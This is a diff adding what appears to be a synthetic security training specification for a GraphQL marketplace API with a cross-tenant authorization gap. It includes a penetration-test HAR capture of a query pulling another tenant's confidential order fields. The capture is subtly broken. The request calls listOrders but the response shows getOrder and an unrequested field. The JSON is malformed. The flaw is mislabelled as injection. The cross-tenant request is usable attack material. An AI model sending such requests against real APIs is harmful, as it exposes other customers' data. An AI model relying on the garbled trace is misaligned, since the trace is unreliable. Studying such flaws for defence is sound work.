@@ -1,0 +1,131 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** ShopGrid Marketplace API
+**Document Version:** 4.9.3 (FINAL)
+**Classification:** SENSITIVE
+**Domain:** E-Commerce / Marketplace
+**Architecture:** GraphQL storefront + microservices
+**Training Example ID:** GQL-0103
+
+## 1.0 Executive Summary
+ShopGrid Marketplace API is a e-commerce / marketplace platform that exposes a GraphQL API to authorised consumers.
+The platform manages purchase records partitioned by tenant (`tenantId`). The architecture uses
+JWT-based OAuth2 authentication, and the JWT carries both the `sub` (user ID) and `tenantId` claims.
+Authorization is expected to be enforced per-resolver on the GraphQL server.
+
+## 2.0 Architecture Overview
+- **API Layer:** GraphQL single endpoint (`POST /graphql`) served via Apollo Server
+- **Auth:** OAuth2 JWT issued by internal IdP; claims include `sub`, `role`, `tenantId`
+- **Database:** PostgreSQL with row-level security policies; each table has a `tenant_id` column
+- **Caching:** Redis cache keyed by `orderId` (NOTE: no user dimension in cache key)
+
+## 3.0 GraphQL Schema
+```graphql
+
+type Order {
+  orderId: ID!
+  tenantId: ID!
+  ownerId: ID!
+  status: String!
+  data: OrderData
+  products: [Product!]
+}
+
+type OrderData {
+  title: String
+  sensitiveField: String      # PII / business-sensitive
+  internalNotes: String       # Internal-only field
+  auditLog: [AuditEntry!]
+}
+
+type Query {
+  getOrder(id: ID!): Order
+  listOrders(tenantId: ID, status: String): [Order!]
+  getOrderWithChildren(id: ID!): Order
+}
+
+type Mutation {
+  updateOrder(id: ID!, input: OrderInput!): Order
+  deleteOrder(id: ID!): Boolean
+  bulkOrderLookup(ids: [ID!]!): [Order!]
+}
+
+```
+
+## 4.0 Known Architectural Notes
+- **RISK-GQL-103:** The `getOrder` resolver fetches by `orderId` only.
+  The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`.
+  Tracked internally as a known gap pending remediation.
+- The `bulkOrderLookup` mutation accepts an arbitrary array of IDs without
+  per-ID ownership filtering.
+
+## 5.0 Vulnerability Context
+**Pattern:** 5.1 — Authorization-bypass injection (Injection)
+
+The `orderId` field is used as the object identifier across all resolvers.
+The resolver handling `orderId` does not enforce ownership or tenancy boundaries, enabling Pattern 5.1 exploitation.
+
+## 6.0 HAR Capture (Network Trace)
+The following HTTP Archive (HAR) capture was recorded during a penetration test.
+The attacker's token belongs to `tenant-ed5f` but the requested object belongs to `tenant-a32d`.
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {"name": "SecurityProxy", "version": "1.0"},
+    "entries": [
+      {
+        "startedDateTime": "2026-04-13T16:22:35.055512+00:00",
+        "time": 163,
+        "request": {
+          "method": "POST",
+          "url": "https://api.shopgrid-marketplace.example.com/graphql",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            {"name": ":authority", "value": "api.shopgrid-marketplace.example.com"},
+            {"name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"},
+            {"name": "content-type", "value": "application/json"},
+            {"name": "x-tenant-id", "value": "tenant-ed5f"}
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"query\": \"query VulnerableOp { listOrders(tenantId: "tenant-a32d") { orderId ownerId data { sensitiveField } } }\"}"
+          },
+          "bodySize": 99
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "headers": [
+            {"name": "content-type", "value": "application/json"},
+            {"name": "x-request-id", "value": "req-ed5fa32d"}
+          ],
+          "content": {
+            "size": 512,
+            "mimeType": "application/json",
+            "text": "{\"data\": {\"getOrder\": {\"tenantId\": \"tenant-a32d\", \"ownerId\": \"other-user-ed5fa32d\", \"data\": {\"sensitiveField\": \"CONFIDENTIAL-ed5fa32d\", \"internalNotes\": \"Internal data exposed\"}}}}"}"
+          },
+          "bodySize": 390,
+          "redirectURL": "",
+          "headersSize": 120
+        },
+        "timings": {"send": 2, "wait": 157, "receive": 5},
+        "cache": {}
+      }
+    ]
+  }
+}
+```
+
+## 7.0 API Contract (Partial)
+```
+POST /graphql
+Authorization: Bearer <JWT>
+Content-Type: application/json
+
+Body: { "query": "..." }
+
+Authenticated user's tenantId is extracted from JWT.
+Resolver MUST cross-check tenantId against fetched object's tenantId.
+```
